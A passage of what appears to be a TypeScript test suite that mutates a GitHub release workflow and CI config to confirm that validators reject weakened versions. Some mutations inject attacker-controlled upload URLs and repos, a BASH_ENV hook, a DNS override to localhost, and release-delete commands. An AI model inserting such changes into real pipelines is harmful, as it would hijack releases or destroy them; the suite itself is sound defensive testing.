        "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7",
        "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n" +
          "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7"
      ),
      replaceExactly(mcpbInputs.release, createWrite, `${createWrite}\n          ${createWrite}`),
      replaceExactly(
        mcpbInputs.release,
        createWrite,
        `CREATE_ARGS=(api -f draft=true "repos/attacker/repo/releases")\n          ${createWrite}`
      ),
      replaceExactly(mcpbInputs.release, createWrite, `TAG="v0.0.0"\n          ${createWrite}`),
      replaceExactly(mcpbInputs.release, createTarget, 'release create "v0.0.0" --repo "attacker/repo"'),
      replaceExactly(
        mcpbInputs.release,
        rawCreateChannel,
        replaceExactly(rawCreateChannel, '!= "latest"', '= "latest"')
      ),
      replaceExactly(
        mcpbInputs.release,
        "            CREATE_ARGS+=(--prerelease)",
        '            CREATE_ARGS+=(--repo "attacker/repo")'
      ),
      replaceExactly(
        mcpbInputs.release,
        `      - name: Prepare draft GitHub Release
        shell: /bin/bash --noprofile --norc -p -e -o pipefail {0}
        env:
          BASH_ENV: ""`,
        `      - name: Prepare draft GitHub Release
        shell: /bin/bash --noprofile --norc -p -e -o pipefail {0}
        env:
          BASH_ENV: "/tmp/untrusted-hook"`
      ),
      replaceExactly(mcpbInputs.release, 'require_job_reserve 3600 "GitHub draft creation"', "true"),
      replaceExactly(
        mcpbInputs.release,
        '              assert_remote_tag_identity\n              echo "Confirmed exact release $TAG',
        '              echo "Confirmed exact release $TAG'
      ),
      replaceAllExactly(mcpbInputs.release, 'awk -v heading="## [$VERSION] — "', 'awk -v ver="$VERSION"', 3),
      replaceExactly(mcpbInputs.release, uploadWrite, `${uploadWrite}\n                ${uploadWrite}`),
      replaceExactly(
        mcpbInputs.release,
        uploadCurl,
        `"$CURL_BIN" \\\n                --fail-with-body --silent --show-error --request POST --retry 0`
      ),
      replaceExactly(
        mcpbInputs.release,
        "--proxy '' --proto '=https' --tlsv1.2 --max-redirs 0",
        "--proto '=https' --tlsv1.2 --max-redirs 0"
      ),
      replaceExactly(mcpbInputs.release, "--request POST --retry 0", "--request POST --retry 1"),
      replaceExactly(mcpbInputs.release, uploadTarget, '"https://uploads.github.com/repos/attacker/repo/assets")'),
      replaceExactly(
        mcpbInputs.release,
        "              UPLOAD_EXIT=0",
        '              UPLOAD_BASE="https://attacker.invalid/upload"\n              UPLOAD_EXIT=0'
      ),
      replaceExactly(
        mcpbInputs.release,
        "              UPLOAD_EXIT=0",
        '              ENCODED_NAME="attacker"\n              UPLOAD_EXIT=0'
      ),
      replaceExactly(
        mcpbInputs.release,
        "              UPLOAD_EXIT=0",
        '              LOCAL_ASSET="/tmp/attacker"\n              UPLOAD_EXIT=0'
      ),
      replaceExactly(mcpbInputs.release, "              UPLOAD_EXIT=0", "              UPLOAD_EXIT=0 # UPLOAD_EXIT=$?"),
      replaceExactly(
        mcpbInputs.release,
        "              UPLOAD_EXIT=$?",
        "              UPLOAD_EXIT=$?\n              UPLOAD_STATUS=201"
      ),
      replaceExactly(mcpbInputs.release, 'require_job_reserve 1500 "release asset upload for $NAME"', "true"),
      replaceExactly(
        mcpbInputs.release,
        "Immediate pre-upload reconciliation for $NAME",
        "Stale pre-upload reconciliation for $NAME"
      ),
      replaceExactly(
        mcpbInputs.release,
        "Immediate pre-upload confirmation for $NAME",
        "Stale pre-upload confirmation for $NAME"
      ),
      replaceExactly(
        mcpbInputs.release,
        'PREWRITE_ACTION" != "resume_draft" ] || [ "$PREWRITE_NAME_COUNT" -ne 0',
        'PREWRITE_ACTION" != "resume_draft" ] && [ "$PREWRITE_NAME_COUNT" -ne 0'
      ),
      replaceExactly(mcpbInputs.release, "upload_recovery_attempt<=12", "upload_recovery_attempt<=1"),
      replaceExactly(
        mcpbInputs.release,
        '              assert_remote_tag_identity\n            fi\n            if [ "$MATCH_COUNT" -ne 1 ]; then',
        '            fi\n            if [ "$MATCH_COUNT" -ne 1 ]; then'
      ),
      replaceAllExactly(
        mcpbInputs.release,
        releaseProjection,
        "[.[] | {id, name, state, content_type, size}] | sort_by(.name)",
        5
      ),
      replaceExactly(mcpbInputs.release, patchWrite, `${patchWrite}\n            ${patchWrite}`),
      replaceExactly(mcpbInputs.release, patchWrite, `RELEASE_ID=1\n            ${patchWrite}`),
      replaceExactly(mcpbInputs.release, patchWrite, `PUBLISH_FIELDS+=(-F draft=true)\n            ${patchWrite}`),
      replaceExactly(mcpbInputs.release, patchWrite, `PUBLISH_FIELDS=(-F draft=true)\n            ${patchWrite}`),
      replaceExactly(mcpbInputs.release, patchTarget, '"repos/attacker/repo/releases/1"'),
      replaceExactly(
        mcpbInputs.release,
        "PUBLISH_FIELDS+=(-f make_latest=true)",
        "PUBLISH_FIELDS+=(-f make_latest=false)"
      ),
      replaceExactly(
        mcpbInputs.release,
        "PUBLISH_FIELDS+=(-f make_latest=false)",
        "PUBLISH_FIELDS+=(-f make_latest=true)"
      ),
      replaceExactly(mcpbInputs.release, 'require_job_reserve 2400 "GitHub Release publication"', "true"),
      replaceExactly(
        mcpbInputs.release,
        "Immediate pre-publication reconciliation",
        "Stale pre-publication reconciliation"
      ),
      replaceExactly(
        mcpbInputs.release,
        "Immediate pre-publication draft confirmation",
        "Stale pre-publication draft confirmation"
      ),
      replaceExactly(
        mcpbInputs.release,
        '            assert_remote_tag_identity\n            if ! refresh_exact_release_assets "Immediate pre-publication',
        '            if ! refresh_exact_release_assets "Immediate pre-publication'
      ),
      replaceExactly(
        mcpbInputs.release,
        '            elif [ "$FINAL_ACTION" = "reuse_published" ]; then\n              assert_remote_tag_identity',
        '            elif [ "$FINAL_ACTION" = "reuse_published" ]; then'
      ),
      replaceExactly(
        mcpbInputs.release,
        '          elif [ "$FINAL_ACTION" = "reuse_published" ]; then\n            assert_remote_tag_identity',
        '          elif [ "$FINAL_ACTION" = "reuse_published" ]; then'
      ),
      replaceExactly(
        mcpbInputs.release,
        `if ! EXACT_RELEASE=$(gh_read api "repos/\${{ github.repository }}/releases/$RELEASE_ID"); then`,
        `if ! EXACT_RELEASE=$(gh_read api "repos/\${{ github.repository }}/releases/latest"); then`
      ),
      replaceExactly(
        mcpbInputs.release,
        '[ "$LATEST_TAG" = "$TAG" ] && [ "$LATEST_ID" = "$RELEASE_ID" ]',
        '[ "$LATEST_TAG" = "$TAG" ]'
      ),
      replaceExactly(
        mcpbInputs.release,
        createWrite,
        `"$GH_BIN" api --method POST "repos/attacker/repo/releases"\n          ${createWrite}`
      ),
      replaceExactly(
        mcpbInputs.release,
        createWrite,
        `"$GH_BIN" api -f draft=true "repos/attacker/repo/releases"\n          ${createWrite}`
      ),
      replaceExactly(
        mcpbInputs.release,
        createWrite,
        `gh api -f draft=true "repos/attacker/repo/releases"\n          ${createWrite}`
      ),
      replaceExactly(
        mcpbInputs.release,
        "--proxy '' --proto '=https' --tlsv1.2 --max-redirs 0",
        "--proxy '' --resolve uploads.github.com:443:127.0.0.1 --proto '=https' --tlsv1.2 --max-redirs 0"
      ),
      replaceExactly(mcpbInputs.release, uploadTarget, '"$UPLOAD_BASE?name=$ENCODED_NAME" "$EVIL_URL")'),
      replaceExactly(
        mcpbInputs.release,
        releaseTransactionTail,
        replaceExactly(
          releaseTransactionTail,
          "          assert_remote_tag_identity",
          '          "$GH_BIN" api --method DELETE "repos/unsafe"\n          assert_remote_tag_identity'
        )
      ),
      replaceExactly(
        mcpbInputs.release,
        releaseTransactionTail,
        replaceExactly(
          releaseTransactionTail,
          "          assert_remote_tag_identity",
          '          "$GH_BIN" release delete "$TAG"\n          assert_remote_tag_identity'
        )
      )
    ];
    for (const [mutationIndex, weakenedReleaseTransaction] of releaseTransactionMutations.entries()) {
      expect(
        githubReleaseTransactionProblems(weakenedReleaseTransaction),
        `release transaction mutation ${mutationIndex + 1} must fail closed`
      ).not.toEqual([]);
    }
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        releaseTransaction: replaceExactly(
          mcpbInputs.releaseTransaction,
          "Final release contains unexpected asset",
          "Final release accepted unexpected asset"
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    for (const weakenedUploadConfirmation of uploadConfirmationMutations) {
      expect(githubReleaseTransactionProblems(weakenedUploadConfirmation)).toContain(
        "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
      );
    }
    for (const weakenedPublicationBoundary of publicationBoundaryMutations) {
      expect(githubReleaseTransactionProblems(weakenedPublicationBoundary)).toContain(
        "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
      );
    }
    for (const weakenedSnapshotShape of snapshotShapeMutations) {
      expect(githubReleaseTransactionProblems(weakenedSnapshotShape)).toContain(
        "release authorization snapshots must preserve their exact state and metadata projections"
      );
    }
    for (const forbiddenReleaseCliMutation of [
      replaceExactly(
        mcpbInputs.release,
        releaseTransactionTail,
        replaceExactly(
          releaseTransactionTail,
          "          assert_remote_tag_identity",
          '          "$GH_BIN" release delete "$TAG"\n          assert_remote_tag_identity'
        )
      ),
      replaceExactly(
        mcpbInputs.release,
        releaseTransactionTail,
        replaceExactly(
          releaseTransactionTail,
          "          assert_remote_tag_identity",
          '          echo "$("$GH_BIN" release delete "$TAG")"\n          assert_remote_tag_identity'
        )
      )
    ]) {
      expect(githubReleaseTransactionProblems(forbiddenReleaseCliMutation)).toContain(
        "GitHub Release recovery must expose no delete, clobber, or transport-replay path"
      );
    }
    expect(
      githubReleaseTransactionProblems(
        replaceAllExactly(
          mcpbInputs.release,
          "shell: /bin/bash --noprofile --norc -p -e -o pipefail {0}",
          "shell: /bin/bash --noprofile --norc -e -o pipefail {0}",
          RELEASE_HARDENED_SHELL_COUNT
        )
      )
    ).toContain(
      "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
    );
    expect(
      githubReleaseTransactionProblems(
        replaceExactly(
          mcpbInputs.release,
          rawCreateChannel,
          replaceExactly(rawCreateChannel, '!= "latest"', '= "latest"')
        )
      )
    ).toContain("draft creation must be one bounded write followed by exact readback without replay");
    expect(
      githubReleaseTransactionProblems(
        replaceExactly(
          mcpbInputs.release,
          "Immediate pre-upload confirmation for $NAME",
          "Stale pre-upload confirmation for $NAME"
        )
      )
    ).toContain("each missing release asset must use one retry-free POST and exact no-replay reconciliation");
    expect(
      githubReleaseTransactionProblems(
        replaceExactly(
          mcpbInputs.release,
          "PUBLISH_FIELDS+=(-f make_latest=true)",
          "PUBLISH_FIELDS+=(-f make_latest=false)"
        )
      )
    ).toContain("release publication must be one bounded PATCH followed by exact-ID convergence without replay");
    expect(
      githubReleaseTransactionProblems(
        replaceExactly(
          mcpbInputs.release,
          createWrite,
          `gh api -f draft=true "repos/attacker/repo/releases"\n          ${createWrite}`
        )
      )
    ).toContain("GitHub Release recovery must expose no delete, clobber, or transport-replay path");
    for (const weakenedReleaseEvaluator of [
      replaceExactly(mcpbInputs.integrity, 'asset.state !== "uploaded"', 'asset.state !== "starter"'),
      replaceExactly(
        mcpbInputs.integrity,
        'asset.content_type !== "application/octet-stream"',
        'asset.content_type !== "text/plain"'
      ),
      replaceExactly(mcpbInputs.integrity, "asset.size <= 0", "asset.size < 0"),
      replaceExactly(
        mcpbInputs.integrity,
        "/^sha256:[0-9a-f]{64}$/u.test(asset.digest)",
        "/^sha256:/u.test(asset.digest)"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'prerelease !== "true" && prerelease !== "false"',
        'prerelease !== "true" && prerelease !== "draft"'
      ),
      replaceExactly(mcpbInputs.integrity, "release.name !== expected.name", "release.name !== release.name"),
      replaceExactly(mcpbInputs.integrity, "release.body !== expected.body", "release.body !== release.body"),
      replaceExactly(mcpbInputs.integrity, "name: process.env.EXPECTED_RELEASE_NAME", "name: payload?.release?.name"),
      replaceExactly(mcpbInputs.integrity, "body: process.env.EXPECTED_RELEASE_BODY", "body: payload?.release?.body")
    ]) {
      expect(mcpbContractProblems({ ...mcpbInputs, integrity: weakenedReleaseEvaluator })).toContain(
        "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
      );
    }
    const lateChannelGuard = replaceExactly(
      mcpbInputs.release,
      MCPB_NPM_CHANNEL_ADVANCE,
      '            PRE_PUBLISH_INTEGRITY=$(tarball_sri "$PACKAGE_TARBALL")\n' +
        "            node scripts/check-release-integrity.mjs channel-advance \\\n" +
        '              "$VERSION" "$PRE_WRITE_CHANNEL_VERSION" "$CHANNEL"'
    );
    expect(mcpbContractProblems({ ...mcpbInputs, release: lateChannelGuard })).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    const latestOnlyChannelGuard = replaceExactly(
      mcpbInputs.release,
      MCPB_NPM_CHANNEL_ADVANCE,
      `            if [ "\${{ steps.dist_tag.outputs.tag }}" = "latest" ]; then\n` +
        "              node scripts/check-release-integrity.mjs channel-advance \\\n" +
        '                "$VERSION" "$PRE_WRITE_CHANNEL_VERSION" "$CHANNEL"\n' +
        "            fi\n" +
        '            PRE_PUBLISH_INTEGRITY=$(tarball_sri "$PACKAGE_TARBALL")'
    );
    expect(mcpbContractProblems({ ...mcpbInputs, release: latestOnlyChannelGuard })).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(mcpbInputs.release, 'NPM_ACTION" = "reuse_superseded"', 'NPM_ACTION" = "reuse"')
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
          "is not GitHub's latest release before npm publication",
          "latest release checked after npm"
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceAllExactly(
          mcpbInputs.release,
          `"repos/\${{ github.repository }}/git/ref/tags/$TAG"`,
          '"repos/attacker/repo/git/ref/tags/$TAG"',
          10
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceAllExactly(
          mcpbInputs.release,
          `"repos/\${{ github.repository }}/git/tags/$TAG_OBJECT_SHA"`,
          '"repos/attacker/repo/git/tags/$TAG_OBJECT_SHA"',
          5
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceAllExactly(mcpbInputs.release, ".sha == $tag_object_sha and .tag == $tag", ".tag == $tag", 5)
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceAllExactly(mcpbInputs.release, '.type == "commit" and .sha == $sha', '.type == "commit"', 5)
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceAllExactly(mcpbInputs.release, '.type == "tag" and .sha == $sha', '.type == "tag"', 5)
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    for (const [label, weakenedRelease] of [
      [
        "alternate definition",
        replaceExactly(
          mcpbInputs.release,
          "          assert_stable_github_advance() {",
          "          function assert_remote_tag_identity { return 0; }\n" + "          assert_stable_github_advance() {"
        )
      ],
      [
        "definition suffix",
        replaceExactly(
          mcpbInputs.release,
          "          }\n          assert_stable_github_advance() {",
          "          }; exit 0\n          assert_stable_github_advance() {"
        )
      ],
      [
        "comment-disabled call",
        replaceExactly(
          mcpbInputs.release,
          "          assert_remote_tag_identity\n          # A retry may reuse",
          "          true # assert_remote_tag_identity\n          # A retry may reuse"
        )
      ]
    ] as const) {
      expect(
        mcpbContractProblems({ ...mcpbInputs, release: weakenedRelease }),
        `remote tag identity ${label} must invalidate release provenance`
      ).toContain(
        "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
      );
    }
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
          `"repos/\${{ github.repository }}/releases?per_page=100"`,
          `"repos/\${{ github.repository }}/releases/tags/$TAG"`,
          6
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(
          mcpbInputs.release,
          "npm dist-tag $CHANNEL does not resolve to expected $EXPECTED_CHANNEL_VERSION",
          "npm channel unchecked"
        )
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        release: replaceExactly(mcpbInputs.release, "Final release contains unexpected asset", "Final asset accepted")
      })
    ).toContain(
      "release must reuse exact CI-gated MCPB bytes, re-verify them, and attach transparency records with checkout provenance"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        packageJson: replaceExactly(mcpbInputs.packageJson, '"tmp": "0.2.7"', '"tmp": "0.0.33"')
      })
    ).toContain("MCPB dev graph must override tmp to patched 0.2.7 without the orphaned legacy helper");
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        docsApi: replaceExactly(mcpbInputs.docsApi, "| `--no-prompts`", "| `--prompts-hidden`")
      })
    ).toContain("Basic isolation flags must be shared by stdio/HTTP, documented, and preserve full defaults");
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        consumer: replaceExactly(mcpbInputs.consumer, '["2.0.11"]', '["1.19.9"]')
      })
    ).toContain(
      "MCPB consumer must prove exact inventory, transparency records, resources, omitted deps, negatives, and post-refusal liveness"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        server: replaceExactly(mcpbInputs.server, "const embeddingIndexEnabled = opts.embeddingIndex !== false", "true")
      })
    ).toContain("Basic isolation flags must be shared by stdio/HTTP, documented, and preserve full defaults");
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        build: replaceExactly(
          mcpbInputs.build,
          'path.join(STAGE, "sbom.cdx.json")',
          'path.join(STAGE, "sbom-disabled.json")',
          2
        )
      })
    ).toContain(
      "MCPB builder must pin upstream, omit unsafe feature deps, two-pass inventory official bytes, ship transparency records, and guard owned cleanup"
    );
    expect(
      mcpbContractProblems({
        ...mcpbInputs,
        build: replaceExactly(
          mcpbInputs.build,
          'path.join(STAGE, "third-party-licenses.json")',
          'path.join(STAGE, "third-party-disabled.json")',
          2
        )
      })
    ).toContain(
      "MCPB builder must pin upstream, omit unsafe feature deps, two-pass inventory official bytes, ship transparency records, and guard owned cleanup"
    );

    // NEGATIVE controls: the invariant rejects both the old floating-22 leg
    // and a floor that no longer matches package.json.
    expect(
      nodeFloorCiProblems(replaceExactly(ci, 'node-version: "22.13.0"', "node-version: 22", 7), pkg.engines?.node)
    ).toContain("test (22) must run exact engines.node floor 22.13.0");
    expect(nodeFloorCiProblems(ci, ">=22.14.0")).toContain("test (22) must run exact engines.node floor 22.14.0");
    expect(nodeFloorCiProblems(ci, "22.13.0")).toEqual(["engines.node must be one exact >=X.Y.Z floor"]);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, '      NPM_CONFIG_ENGINE_STRICT: "true"', '      NPM_CONFIG_ENGINE_STRICT: "false"', 7),
        pkg.engines?.node
      )
    ).toContain("test job must enforce npm engine-strict");
    expect(
      nodeFloorCiProblems(replaceExactly(ci, "if (declared !== expected)", "if (false)"), pkg.engines?.node)
    ).toContain("test floor runtime assertion is missing");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "- name: Probe native SQLite and FTS5 at declared floor\n        if: matrix.floor",
          "- name: Probe native SQLite and FTS5 at declared floor\n        if: false"
        ),
        pkg.engines?.node
      )
    ).toContain("test floor native SQLite/FTS probe is missing");
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "      - run: npm test\n        env:", "      - run: echo npm test\n        env:"),
        pkg.engines?.node
      )
    ).toContain("test floor job missing npm test");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "    timeout-minutes: 10\n    env:",
          "    timeout-minutes: 10\n    continue-on-error: true\n    env:"
        ),
        pkg.engines?.node
      )
    ).toContain("test job must not declare continue-on-error");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '          node-version: "22.13.0"\n' +
            "          cache: npm\n" +
            "      - name: Install deps (npm ci with retry)",
          "          node-version: 22\n" + "          cache: npm\n" + "      - name: Install deps (npm ci with retry)"
        ),
        pkg.engines?.node
      )
    ).toContain("smoke must run exact engines.node floor 22.13.0");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "    runs-on: windows-2025\n    timeout-minutes: 20\n    defaults:",
          "    runs-on: ubuntu-latest\n    timeout-minutes: 20\n    defaults:"
        ),
        pkg.engines?.node
      )
    ).toContain("test-windows must preserve its exact name and pinned windows-2025 runner");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '          node-version: "22.13.0"\n' +
            "          cache: npm\n" +
            "          cache-dependency-path: package-lock.json\n" +
            "      - name: Assert real case-insensitive Windows filesystem",
          "          node-version: 22\n" +
            "          cache: npm\n" +
            "          cache-dependency-path: package-lock.json\n" +
            "      - name: Assert real case-insensitive Windows filesystem"
        ),
        pkg.engines?.node
      )
    ).toContain("test-windows must run exact engines.node floor 22.13.0");
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "      NPM_CONFIG_SCRIPT_SHELL: 'C:\\Program Files\\Git\\bin\\bash.exe'\n", ""),
        pkg.engines?.node
      )
    ).toContain("test-windows must run npm lifecycle scripts through pinned Git Bash");
    expect(nodeFloorCiProblems(replaceExactly(ci, '"caseprobe.md"', '"CaseProbe.md"'), pkg.engines?.node)).toContain(
      "test-windows platform and case-insensitive filesystem assertion is missing"
    );
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: Probe native SQLite and FTS5 on Windows\n",
          "      - name: Probe native SQLite and FTS5 on Windows\n        if: false\n"
        ),
        pkg.engines?.node
      )
    ).toContain("test-windows steps must be unconditional and must not declare continue-on-error");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '              throw new Error("Windows filesystem probe is not case-insensitive");',
          "              return;"
        ),
        pkg.engines?.node
      )
    ).toContain("test-windows platform and case-insensitive filesystem assertion is missing");
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, 'if (row?.body !== "windows probe")', 'if (row?.body === "windows probe")'),
        pkg.engines?.node
      )
    ).toContain("test-windows native SQLite/FTS probe is missing");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - run: npm test -- tests/windows-path-safety.test.ts",
          "      - run: echo npm test -- tests/windows-path-safety.test.ts"
        ),
        pkg.engines?.node
      )
    ).toContain("test-windows missing the executable hostile-filesystem suite");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "        run: npm test -- tests/watcher-activation-guard.test.ts",
          "        run: echo npm test -- tests/watcher-activation-guard.test.ts"
        ),
        pkg.engines?.node
      )
    ).toContain("test-windows missing the exact watcher activation-guard suite");
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "        run: npm run render:preview", "        run: echo npm run render:preview"),
        pkg.engines?.node
      )
    ).toContain("docs job must regenerate and fail closed on social-preview byte drift");
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "  docs:\n    runs-on: ubuntu-latest", "  docs:\n    if: false\n    runs-on: ubuntu-latest"),
        pkg.engines?.node
      )
    ).toContain("docs job must regenerate and fail closed on social-preview byte drift");
    const ciWithoutPreviewRender = replaceExactly(
      ci,
      "      - id: preview_render\n        run: npm run render:preview\n",
      ""
    );
    const ciWithLatePreviewRender = replaceExactly(
      ciWithoutPreviewRender,
      "        run: git diff --exit-code -- assets/social-preview.png\n",
      "        run: git diff --exit-code -- assets/social-preview.png\n" +
        "      - id: preview_render\n" +
        "        run: npm run render:preview\n"
    );
    expect(nodeFloorCiProblems(ciWithLatePreviewRender, pkg.engines?.node)).toContain(
      "docs job must regenerate and fail closed on social-preview byte drift"
    );
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: Require committed social-preview bytes\n",
          "      - name: Require committed social-preview bytes\n        if: false\n"
        ),
        pkg.engines?.node
      )
    ).toContain("docs job must regenerate and fail closed on social-preview byte drift");
    const previewExportBlock =
      "      - name: Export remotely rendered social preview\n" +
      "        id: preview_artifact\n" +
      "        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7\n" +
      "        with:\n" +
      "          name: rendered-social-preview\n" +
      "          path: assets/social-preview.png\n" +
      "          if-no-files-found: error\n" +
      "          retention-days: 3\n" +
      "          compression-level: 0\n";
    expect(nodeFloorCiProblems(replaceExactly(ci, previewExportBlock, ""), pkg.engines?.node)).toContain(
      "docs job must export the remotely rendered social preview before byte-drift enforcement"
    );
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "          path: assets/social-preview.png", "          path: assets/stale-preview.png"),
        pkg.engines?.node
      )
    ).toContain("docs job must export the remotely rendered social preview before byte-drift enforcement");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "          name: rendered-social-preview\n" +
            "          path: assets/social-preview.png\n" +
            "          if-no-files-found: error",
          "          name: rendered-social-preview\n" +
            "          path: assets/social-preview.png\n" +
            "          if-no-files-found: warn"
        ),
        pkg.engines?.node
      )
    ).toContain("docs job must export the remotely rendered social preview before byte-drift enforcement");
    const ciWithoutPreviewExport = replaceExactly(ci, previewExportBlock, "");
    const ciWithLatePreviewExport = replaceExactly(
      ciWithoutPreviewExport,
      "        run: git diff --exit-code -- assets/social-preview.png\n",
      `        run: git diff --exit-code -- assets/social-preview.png\n${previewExportBlock}`
    );
    expect(nodeFloorCiProblems(ciWithLatePreviewExport, pkg.engines?.node)).toContain(
      "docs job must export the remotely rendered social preview before byte-drift enforcement"
    );
    expect(
      nodeFloorCiProblems(replaceExactly(ci, "    needs: [test, test-windows]", "    needs: [test]"), pkg.engines?.node)
    ).toContain("smoke must wait for exactly the Linux matrix and blocking Windows job");
    expect(
      nodeFloorCiProblems(replaceExactly(ci, `    if: \${{ always() }}`, "    if: success()", 4), pkg.engines?.node)
    ).toContain("smoke must run its prerequisite gate even after an upstream failure");
    expect(nodeFloorCiProblems(replaceExactly(ci, ' ] || [ "', ' ] && [ "'), pkg.engines?.node)).toContain(
      "smoke prerequisite gate must fail closed on either Linux or Windows failure"
    );
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: Require Linux and Windows test prerequisites\n",
          "      - name: Require Linux and Windows test prerequisites\n        if: false\n"
        ),
        pkg.engines?.node
      )
    ).toContain("smoke prerequisite gate must fail closed on either Linux or Windows failure");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: JSON-RPC smoke test (scan path)\n",
          "      - name: JSON-RPC smoke test (scan path)\n        if: false\n"
        ),
        pkg.engines?.node
      )
    ).toContain("smoke functional steps must be unconditional and fail-capable");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "            exit 1\n          fi\n      - uses: actions/checkout@",
          "            exit 0\n          fi\n      - uses: actions/checkout@"
        ),
        pkg.engines?.node
      )
    ).toContain("smoke prerequisite gate must fail closed on either Linux or Windows failure");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "          - label: windows\n            os: windows-2025\n            script_shell: 'C:\\Program Files\\Git\\bin\\bash.exe'",
          "          - label: windows\n            os: ubuntu-latest\n            script_shell: /bin/bash",
          3
        ),
        pkg.engines?.node
      )
    ).toContain("protocol-conformance matrix must preserve its exact blocking platform inventory");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "          - label: macos\n            os: macos-latest",
          "          - label: macos\n            os: ubuntu-latest",
          2
        ),
        pkg.engines?.node
      )
    ).toContain("package-consumer matrix must preserve its exact blocking platform inventory");
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "    needs: protocol-conformance-matrix", "    needs: test"),
        pkg.engines?.node
      )
    ).toContain("protocol-conformance aggregate must fail closed over every matrix lane");
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "npm run schema:inventory -- --write", "echo schema inventory disabled"),
        pkg.engines?.node
      )
    ).toContain("docs job must export and fail closed on remotely captured MCP schema drift");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "        run: node scripts/package-consumer.mjs",
          "        run: echo package-consumer-disabled"
        ),
        pkg.engines?.node
      )
    ).toContain("package-consumer matrix must be exact-floor, unconditional, fail-capable, built, and executable");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: Verify canonical MCPB content and official-client contract\n        run: npm run mcpb:verify",
          "      - name: Verify canonical MCPB content and official-client contract\n        run: echo mcpb-verification-disabled"
        ),
        pkg.engines?.node
      )
    ).toContain(
      "mcpb-basic matrix must be exact-floor, unconditional, fail-capable, and consume the canonical artifact"
    );
    expect(
      nodeFloorCiProblems(replaceExactly(ci, "    needs: mcpb-basic-matrix", "    needs: test"), pkg.engines?.node)
    ).toContain("mcpb-basic aggregate must fail closed over every matrix lane");
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: Export inspectable canonical MCPB candidate and transparency records\n" +
